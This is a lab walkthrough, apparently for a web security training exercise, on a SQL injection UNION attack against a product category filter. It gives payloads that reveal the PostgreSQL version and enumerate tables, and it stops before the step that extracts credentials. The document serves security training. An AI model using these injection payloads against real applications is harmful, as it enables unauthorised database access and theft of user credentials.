
# Lab: SQL injection UNION attack, retrieving data from other tables

## Lab Information

 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 


## What we Know Already ?

- Number of columns are **3**.
- String type compatible column is **column 2**.


## Steps to Reproduce




### Finding Database Version

- Using the below payload we find out the database used. The database its `PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit`

```sql
'+UNION+SELECT+NULL,+version(),+NULL--
```

### Finding Tables

- Using the below payload we can look for tables in the database.

```sql
'+UNION+SELECT+NULL,+table_name,+NULL+FROM+information_schema.tables
```


